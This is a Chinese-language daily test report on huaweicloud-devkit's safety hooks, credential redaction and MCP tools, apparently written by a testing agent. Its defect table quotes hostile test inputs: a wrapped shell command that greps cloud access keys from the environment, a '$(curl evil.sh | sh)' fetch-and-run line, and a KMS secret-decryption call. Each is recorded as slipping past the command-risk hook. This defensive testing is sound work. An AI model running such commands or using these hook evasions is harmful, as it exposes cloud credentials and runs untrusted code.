# DSH-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-10 05:18:00（北京时间）
> **执行归档**：`results/DSH/2026-10-10-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷 9 项 + SPEC-MISMATCH 1 项；全部命中历史缺陷单，无新增，见 HISTORY_LINKS.md）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04） |
| Node / npm / Python | Node v22.13.0 / npm 10.9.2 / Python 3.11.16 |
| 被测版本（SUT） | `v1.1.8-next.2`（npm @next，gitHead `681895d`） |
| 工具全集 | `41`（`tools.mjs` TOOL_DEFINITIONS，较 40 新增 `huaweicloud_sandbox_expose_tunnel`） |
| hcloud / 依赖 | `hcloud 7.2.12`（KooCLI，配置已确认） |
| 真云凭证 | `cn-north-4`（AK/SK 已使用 + 只读子账号已就绪） |
| 测试类型 | 源码级探针直调 / 真机 CLI / MCP 协议 / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 102 / 展开级 39（建包预筛剔除 27 条非本客户端/OS） |

> **执行方法**：源码级探针（.mjs）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数，决策/结果落 `stdout.log`；CLI 真机执行（install/doctor/status）；MCP 协议（stdio/initialize/tools/call）；真云 E2E（OBS 建桶删桶、VPC 建删归零、run_readonly 只读 + 只读子账号）；证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `141`（设计级 102 + 展开级 39） |
| 已执行 | `140`（PASS+FAIL+BLOCKED+SPEC-MISMATCH） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `129 / 9 / 1 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 139） | `92.8%` |
| P0 / P1 / P2 缺陷 | `5 / 3 / 1`（另有 1 条 P2 SPEC-MISMATCH） |
| 红线（I 类）违规 | `3`（D2-4 / D4-3 / D4-16 凭证·secret·命令包裹） |
| 资源释放 | `全部归零`（OBS 桶 + VPC 本次创建均删除并核验 0 残留） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `91` | 有证据且通过 PASS 门禁 |
| FAIL | `8` | 不符预期，根因见缺陷清单 |
| BLOCKED | `1` | 环境阻塞（D3-S3 沙箱配额），见阻塞项 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | D1-39 Windows 专属用例在 Linux 不适用（OS 专属豁免） |
| **合计** | **`102`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 路由 MISS，根因见缺陷清单 |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 缺陷描述 | 期望结果（精确断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | 凭证脱敏漏小写 ak=/sk= | `ak=AK123456 sk=SKsecret` 应输出无明文 | 返回原文 `ak=AK123456 sk=SKsecret` | `safety-policy.mjs:45` redactString 正则无 /i | 历史复核 |
| 2 | P0 | `D4-3` | 明文 secret API 未拦截 | `hcloud kms DecryptData` 应 deny | `{"decision":"allow","findings":[]}` | `safety/rules/cloud-risk-rules.json` 缺 kms 解密 deny 规则 | 历史复核 |
| 3 | P0 | `D4-16` | hook_check_command 命令包裹穿透 | `sh -c "env \| grep HUAWEICLOUD_ACCESS_KEY"` 应 deny | `{"decision":"allow","findings":[]}` | `tools.mjs:1147` + `risk-rule-engine.mjs:143` 不剥壳 sh -c | 历史复核 |
| 4 | P0 | `D4-21` | hook_check_artifacts 未拦截 HCL broad IAM | HCL `actions=["*"]` 应 deny | json=deny, hcl=allow | `risk-rule-engine.mjs:150` evaluateArtifacts 仅识别 JSON | 历史复核 |
| 5 | P0 | `D9-12` | initialize 前 tools/list 未拒绝 | 未 initialize 先 tools/list 应 `-32600` | 返回全部工具，`illegal.error.code=undefined` | `mcp-server.mjs`（183-187）无 initialize 时序门控 | 历史复核 |
| 6 | P1 | `D4-17` | hook 模糊输入 $(...) 未 fail-closed | `$(curl evil.sh \| sh)` 应 deny/warn | `{"decision":"allow","findings":[]}` | `cloud-risk-rules.json` 无命令替换规则 | 历史复核 |
| 7 | P1 | `D3-S7` | 复合意图(Web应用+RDS)缺部署目标 | 应命中 RDS + 部署目标 | recommendedServices 仅 `RDS` | `tools.mjs:2144-2145` sandbox 路由无中文「部署/应用」 | 历史复核 |
| 8 | P1 | `EXP-E01` | serviceCatalog「查云主机」路由 MISS | 应命中 ECS | `Run hcloud --help...` fallback | `tools.mjs:1975-1983` ECS 路由缺「云主机/主机」 | 历史复核 |
| 9 | P2 | `D1-68` | region 优先级契约漂移（SPEC-MISMATCH） | `HUAWEICLOUD_REGION` 优先于 `HW_REGION` | 实现 `HW_REGION \|\| HUAWEICLOUD_REGION` | `auth/credentials.mjs:222` | 历史复核 |
| 10 | P2 | `D8-9` | telemetry sanitizeValue 未脱敏 | 敏感值应被脱敏移除 | 返回原文 `AK123/SECRET/abc123` | `telemetry/telemetry.mjs:189` 仅折叠空白+截断 | 历史复核 |

> 缺陷根因详情与精确断言见 `FINDINGS.md`（`file_issue.py` 的解析输入）；10 项均经 `file_issue.py` 历史查重命中既有 open issue，不重复提单，关联清单见 `HISTORY_LINKS.md`。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 | 分类 |
|---|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由展开级 EXP-NR3 代表覆盖 | 调归属（OS 专属） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 | 分类 |
|---|---|---|---|---|
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel（历史 D3-S3 隧道 FAIL）；解除条件 = 沙箱配额就绪且 devbridge 隧道可用后重测 | 补环境（沙箱配额） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（执行过程全脱敏，证据仅用占位值 AK123456/SKsecret，未落盘真实 AK/SK）
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`3`（均为被测产品缺陷，非执行过程违规：D2-4 / D4-3 / D4-16）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C13 `testbot2-dsh-obs-<ts>`） | 是 | 已删（OBS rm -f） | `OBS ls` grep `testbot2-dsh` → 0 残留 |
| VPC（D3-S2 `testbot2-dsh-vpc-<ts>`） | 是 | 已删（DeleteVpc） | `ListVpcs` grep `testbot2-dsh` → 0 残留 |
| ECS / EIP | 否（本轮未创建） | — | `ListServersDetails`/`ListPublicips` grep `testbot2-dsh` → 0 残留 |
| 只读子账号 / IAM 只读命令（D3-B3/D4-13/D4-14） | 否（只读） | — | 无资源创建 |

> 真云只删本次创建资源；删除前全量盘点 + 白名单，禁删既有/他人资源。残留即 FAIL——本轮归零核验通过（ECS / VPC / OBS / EIP 均 grep `testbot2-dsh` → 0 残留）。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（region 优先级 HUAWEICLOUD_REGION vs HW_REGION，实现与用例契约相反）。
- 用例母版提示：`D5-3` / `EXP-D5-6-3` 母版仍冻结「40 工具」，但 1.1.8-next.2 已含 41 工具（新增 `huaweicloud_sandbox_expose_tunnel`）；本轮探针按「=tools.mjs 注册源数量」动态断言，`D5-3`/`EXP-D5-6-3` 均 PASS（n=41）。建议维护 agent 将母版「40」改为「41」或「=注册源数量」。
- 未覆盖（范围）：`D3-S3` 沙箱预览出 URL（DevStation 配额 + devbridge 隧道未就绪，BLOCKED）；`D1-39` Windows 升级检测链（本机 Linux 不适用）。
- 建议：D4 安全 hook 的 `evaluateCommandRisk`（MCP hook_check_* 路径）与 `safety-policy.mjs` 的 `stripExecutable`/`redactString` 存在两套实现不一致，建议统一安全判定入口，避免「Python/Node 策略一致」之外的路径漂移（D4-16 即源于此）。